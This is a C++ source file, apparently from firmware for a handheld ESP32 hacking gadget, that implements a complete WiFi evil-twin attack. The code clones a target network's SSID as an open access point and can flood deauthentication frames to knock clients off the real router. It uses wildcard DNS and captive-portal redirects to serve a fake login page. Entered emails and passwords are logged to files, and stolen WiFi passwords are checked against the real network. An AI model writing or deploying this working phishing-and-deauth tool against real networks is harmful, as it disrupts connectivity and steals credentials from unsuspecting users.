#include "WifiEvilTwinScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "screens/wifi/WifiMenuScreen.h"
#include "utils/WifiAttackUtil.h"
#include "ui/actions/InputTextAction.h"
#include "ui/actions/ShowStatusAction.h"

#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>

// ── Destructor ──────────────────────────────────────────────────────────────

WifiEvilTwinScreen::~WifiEvilTwinScreen()
{
  _stopAttack();
}

// ── Lifecycle ───────────────────────────────────────────────────────────────

void WifiEvilTwinScreen::onInit()
{
  _showMenu();
}

void WifiEvilTwinScreen::onItemSelected(uint8_t index)
{
  if (_state == STATE_MENU) {
    switch (index) {
      case 0: _selectWifi();    break;
      case 1:
        _deauth = !_deauth;
        _showMenu();
        break;
      case 2: _selectPortal();  break;
      case 3: _checkPassword(); break;
      case 4: _startAttack();   break;
    }
  } else if (_state == STATE_SELECT_WIFI && index < _scanCount) {
    _target.ssid    = WiFi.SSID(index);
    _target.channel = WiFi.channel(index);
    sscanf(_scanValues[index], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &_target.bssid[0], &_target.bssid[1], &_target.bssid[2],
           &_target.bssid[3], &_target.bssid[4], &_target.bssid[5]);
    _showMenu();
  } else if (_state == STATE_SELECT_PORTAL && index < _portalCount) {
    _portalFolder = _portalNames[index];
    _showMenu();
  }
}

void WifiEvilTwinScreen::onUpdate()
{
  if (_state != STATE_RUNNING) {
    ListScreen::onUpdate();
    return;
  }

  // Handle exit
  if (Uni.Nav->wasPressed()) {
    const auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
      _stopAttack();
      _showMenu();
      return;
    }
  }

  // DNS
  if (_dns) _dns->processNextRequest();

  // Deauth
  if (_deauth && _attacker && millis() - _lastDeauth > 100) {
    _attacker->deauthenticate(_target.bssid, _target.channel);
    _lastDeauth = millis();
  }

  // Redraw
  if (millis() - _lastDraw > 500) {
    _drawLog();
    _lastDraw = millis();
  }
}

void WifiEvilTwinScreen::onBack()
{
  if (_state == STATE_SELECT_WIFI || _state == STATE_SELECT_PORTAL) {
    _showMenu();
  } else if (_state == STATE_RUNNING) {
    _stopAttack();
    _showMenu();
  } else {
    Screen.setScreen(new WifiMenuScreen());
  }
}

// ── Menu ────────────────────────────────────────────────────────────────────

void WifiEvilTwinScreen::_showMenu()
{
  _state = STATE_MENU;
  _networkSub = _target.ssid;
  _deauthSub  = _deauth ? "On" : "Off";
  _portalSub  = _portalFolder.isEmpty() ? "Default" : _portalFolder;

  _menuItems[0] = {"Network",        _networkSub.c_str()};
  _menuItems[1] = {"Deauth",         _deauthSub.c_str()};
  _menuItems[2] = {"Portal",         _portalSub.c_str()};
  _menuItems[3] = {"Check Password"};
  _menuItems[4] = {"Start"};
  setItems(_menuItems, 5);
}

// ── WiFi Scan ───────────────────────────────────────────────────────────────

void WifiEvilTwinScreen::_selectWifi()
{
  _state = STATE_SELECT_WIFI;
  ShowStatusAction::show("Scanning...", 0);

  WiFi.mode(WIFI_STA);
  const int total = WiFi.scanNetworks();

  if (total == 0) {
    ShowStatusAction::show("No networks found");
    _showMenu();
    return;
  }

  _scanCount = total > MAX_SCAN ? MAX_SCAN : total;
  for (int i = 0; i < _scanCount; i++) {
    snprintf(_scanLabels[i], sizeof(_scanLabels[i]), "[%2d] %s",
             WiFi.channel(i), WiFi.SSID(i).c_str());
    snprintf(_scanValues[i], sizeof(_scanValues[i]), "%s",
             WiFi.BSSIDstr(i).c_str());
    _scanItems[i] = {_scanLabels[i], _scanValues[i]};
  }

  setItems(_scanItems, _scanCount);
}

// ── Portal Selection ────────────────────────────────────────────────────────

void WifiEvilTwinScreen::_selectPortal()
{
  _state = STATE_SELECT_PORTAL;

  if (!Uni.Storage || !Uni.Storage->isAvailable()) {
    ShowStatusAction::show("No storage available");
    _showMenu();
    return;
  }

  IStorage::DirEntry entries[MAX_PORTALS];
  uint8_t count = Uni.Storage->listDir("/unigeek/wifi/portals", entries, MAX_PORTALS);

  _portalCount = 0;
  for (int i = 0; i < count && _portalCount < MAX_PORTALS; i++) {
    if (entries[i].isDir) {
      _portalNames[_portalCount] = entries[i].name;
      _portalItems[_portalCount] = {_portalNames[_portalCount].c_str()};
      _portalCount++;
    }
  }

  if (_portalCount == 0) {
    ShowStatusAction::show("No portals found");
    _showMenu();
    return;
  }

  setItems(_portalItems, _portalCount);
}

// ── Check Password ──────────────────────────────────────────────────────────

void WifiEvilTwinScreen::_checkPassword()
{
  if (_target.ssid == "-") {
    ShowStatusAction::show("Select a network first!");
    render();
    return;
  }

  String pwd = InputTextAction::popup("Password");
  render();

  if (pwd.isEmpty()) return;

  ShowStatusAction::show("Connecting...", 0);

  WiFi.mode(WIFI_STA);
  WiFi.begin(_target.ssid.c_str(), pwd.c_str());

  unsigned long start = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - start < 10000) {
    delay(100);
  }

  bool ok = WiFi.status() == WL_CONNECTED;
  WiFi.disconnect();

  if (ok) {
    if (Uni.Speaker) Uni.Speaker->playWin();
    ShowStatusAction::show("Password correct!");
  } else {
    if (Uni.Speaker) Uni.Speaker->playLose();
    ShowStatusAction::show("Password wrong!");
  }
  render();
}

// ── Portal HTML ─────────────────────────────────────────────────────────────

void WifiEvilTwinScreen::_loadPortalHtml()
{
  _portalBasePath = "";
  if (!_portalFolder.isEmpty() && Uni.Storage && Uni.Storage->isAvailable()) {
    _portalBasePath = "/unigeek/wifi/portals/" + _portalFolder;
    String path = _portalBasePath + "/index.htm";
    if (Uni.Storage->exists(path.c_str())) {
      _portalHtml = Uni.Storage->readFile(path.c_str());
      String successPath = _portalBasePath + "/success.htm";
      if (Uni.Storage->exists(successPath.c_str())) {
        _successHtml = Uni.Storage->readFile(successPath.c_str());
      } else {
        _successHtml = _defaultSuccessHtml();
      }
      return;
    }
  }
  _portalBasePath = "";
  _portalHtml  = _defaultPortalHtml();
  _successHtml = _defaultSuccessHtml();
}

String WifiEvilTwinScreen::_getMimeType(const String& path)
{
  if (path.endsWith(".css"))  return "text/css";
  if (path.endsWith(".js"))   return "application/javascript";
  if (path.endsWith(".htm"))  return "text/html";
  if (path.endsWith(".html")) return "text/html";
  if (path.endsWith(".png"))  return "image/png";
  if (path.endsWith(".jpg"))  return "image/jpeg";
  if (path.endsWith(".gif"))  return "image/gif";
  if (path.endsWith(".svg"))  return "image/svg+xml";
  if (path.endsWith(".ico"))  return "image/x-icon";
  return "text/plain";
}

void WifiEvilTwinScreen::_serveStaticFile(AsyncWebServerRequest* req, const String& path)
{
  if (_portalBasePath.isEmpty() || !Uni.Storage || !Uni.Storage->isAvailable()) {
    req->redirect("/");
    return;
  }
  String filePath = _portalBasePath + path;
  if (Uni.Storage->exists(filePath.c_str())) {
    String content = Uni.Storage->readFile(filePath.c_str());
    req->send(200, _getMimeType(path), content);
  } else {
    req->redirect("/");
  }
}

const char* WifiEvilTwinScreen::_defaultPortalHtml()
{
  return
    "<html><head><meta name=\"viewport\" content=\"width=device-width\">"
    "<title>WiFi Login</title>"
    "<style>body{font-family:sans-serif;margin:40px auto;max-width:350px;text-align:center}"
    "input{width:90%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px}"
    "button{width:95%;padding:12px;background:#4CAF50;color:white;border:none;border-radius:4px;cursor:pointer}"
    "</style></head><body>"
    "<h2>WiFi Authentication</h2>"
    "<p>Please enter your credentials to connect</p>"
    "<form action=\"/\" method=\"POST\">"
    "<input name=\"email\" placeholder=\"Email or Username\" required>"
    "<input name=\"password\" type=\"password\" placeholder=\"Password\" required>"
    "<button type=\"submit\">Connect</button>"
    "</form></body></html>";
}

const char* WifiEvilTwinScreen::_defaultSuccessHtml()
{
  return
    "<html><head><meta name=\"viewport\" content=\"width=device-width\">"
    "<title>Success</title>"
    "<style>body{font-family:sans-serif;margin:40px auto;max-width:350px;text-align:center}"
    "</style></head><body>"
    "<h2>Connected!</h2>"
    "<p>You are now connected to the network.</p>"
    "</body></html>";
}

// ── Start / Stop Attack ─────────────────────────────────────────────────────

void WifiEvilTwinScreen::_startAttack()
{
  const MacAddr blank = {0, 0, 0, 0, 0, 0};
  if (_target.ssid == "-" && memcmp(_target.bssid, blank, 6) == 0) {
    ShowStatusAction::show("Select a network first!");
    return;
  }

  _state     = STATE_RUNNING;
  _logCount  = 0;
  _pwdCount  = 0;
  _lastDraw  = 0;
  _lastDeauth = 0;

  _loadPortalHtml();

  // Create soft AP cloning the target SSID on target channel
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(_target.ssid.c_str(), "", _target.channel);
  IPAddress apIP = WiFi.softAPIP();

  _addLog("AP started");

  // DNS server — redirect all to AP IP
  _dns = new DNSServer();
  _dns->start(53, "*", apIP);
  _addLog("DNS started");

  // Deauth
  if (_deauth) {
    _attacker = new WifiAttackUtil();
    _addLog("Deauth enabled");
  }

  // Web server
  _server = new AsyncWebServer(80);

  // Captive portal detection endpoints
  _server->on("/generate_204", HTTP_GET, [this](AsyncWebServerRequest* req) {
    req->redirect("/");
  });
  _server->on("/fwlink", HTTP_GET, [this](AsyncWebServerRequest* req) {
    req->redirect("/");
  });
  _server->on("/hotspot-detect.html", HTTP_GET, [this](AsyncWebServerRequest* req) {
    req->redirect("/");
  });
  _server->on("/connecttest.txt", HTTP_GET, [this](AsyncWebServerRequest* req) {
    req->redirect("/");
  });

  // Serve portal
  _server->on("/", HTTP_GET, [this](AsyncWebServerRequest* req) {
    // Check for GET params (some portals use GET)
    if (req->hasParam("password")) {
      String email = req->hasParam("email") ? req->getParam("email")->value() : "";
      String pwd   = req->getParam("password")->value();
      _saveCaptured(email, pwd);
      req->send(200, "text/html", _successHtml);
      return;
    }
    _addLog("[+] Portal visited");
    req->send(200, "text/html", _portalHtml);
  });

  // Handle POST
  _server->on("/", HTTP_POST, [this](AsyncWebServerRequest* req) {
    String email, pwd;
    if (req->hasParam("email", true))    email = req->getParam("email", true)->value();
    if (req->hasParam("password", true)) pwd   = req->getParam("password", true)->value();
    _saveCaptured(email, pwd);
    req->send(200, "text/html", _successHtml);
  });

  // Catch-all: serve static files from portal folder, or redirect to portal
  _server->onNotFound([this](AsyncWebServerRequest* req) {
    String path = req->url();
    if (path.endsWith(".css") || path.endsWith(".js") ||
        path.endsWith(".png") || path.endsWith(".jpg") ||
        path.endsWith(".gif") || path.endsWith(".svg") ||
        path.endsWith(".ico")) {
      _serveStaticFile(req, path);
      return;
    }
    req->redirect("/");
  });

  _server->begin();
  _addLog("Web server started");
  _addLog("BACK/Press to stop");

  _drawLog();
}

void WifiEvilTwinScreen::_stopAttack()
{
  if (_server) {
    _server->end();
    delete _server;
    _server = nullptr;
  }
  if (_dns) {
    _dns->stop();
    delete _dns;
    _dns = nullptr;
  }
  if (_attacker) {
    delete _attacker;
    _attacker = nullptr;
  }
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);

  _portalHtml  = "";
  _successHtml = "";
}

// ── Credential Capture ──────────────────────────────────────────────────────

void WifiEvilTwinScreen::_saveCaptured(const String& email, const String& password)
{
  _pwdCount++;

  char logMsg[60];
  snprintf(logMsg, sizeof(logMsg), "[+] Pwd: %s", password.c_str());
  _addLog(logMsg);

  if (Uni.Speaker) Uni.Speaker->playNotification();

  if (!Uni.Storage || !Uni.Storage->isAvailable()) return;

  Uni.Storage->makeDir("/unigeek/wifi/captives");

  // Build filename from BSSID and SSID
  char bssidStr[18];
  snprintf(bssidStr, sizeof(bssidStr), "%02X%02X%02X%02X%02X%02X",
           _target.bssid[0], _target.bssid[1], _target.bssid[2],
           _target.bssid[3], _target.bssid[4], _target.bssid[5]);

  String filename = "/unigeek/wifi/captives/" + String(bssidStr) + "_" + _target.ssid + ".txt";

  // Append credential
  fs::File f = Uni.Storage->open(filename.c_str(), FILE_APPEND);
  if (f) {
    if (!email.isEmpty()) {
      f.print(email);
      f.print(":");
    }
    f.println(password);
    f.close();
  }
}

// ── Log Display ─────────────────────────────────────────────────────────────

void WifiEvilTwinScreen::_addLog(const char* msg)
{
  if (_logCount < MAX_LOG) {
    strncpy(_logLines[_logCount], msg, 59);
    _logLines[_logCount][59] = '\0';
    _logCount++;
  } else {
    // Shift up
    for (int i = 0; i < MAX_LOG - 1; i++) {
      memcpy(_logLines[i], _logLines[i + 1], 60);
    }
    strncpy(_logLines[MAX_LOG - 1], msg, 59);
    _logLines[MAX_LOG - 1][59] = '\0';
  }
}

void WifiEvilTwinScreen::_drawLog()
{
  TFT_eSprite sp(&Uni.Lcd);
  sp.createSprite(bodyW(), bodyH());
  sp.fillSprite(TFT_BLACK);

  // Status bar
  char status[40];
  snprintf(status, sizeof(status), "Pwd: %d  |  %s", _pwdCount, _target.ssid.c_str());
  sp.setTextDatum(TL_DATUM);
  sp.setTextColor(TFT_GREEN, TFT_BLACK);
  sp.drawString(status, 2, 2, 1);

  // Separator
  sp.drawFastHLine(0, 12, bodyW(), TFT_DARKGREY);

  // Log lines
  sp.setTextColor(TFT_WHITE, TFT_BLACK);
  int lineH  = 10;
  int startY = 14;
  int maxVisible = (bodyH() - startY) / lineH;
  int startIdx   = _logCount > maxVisible ? _logCount - maxVisible : 0;

  for (int i = startIdx; i < _logCount; i++) {
    int y = startY + (i - startIdx) * lineH;
    sp.drawString(_logLines[i], 2, y, 1);
  }

  sp.pushSprite(bodyX(), bodyY());
  sp.deleteSprite();
}
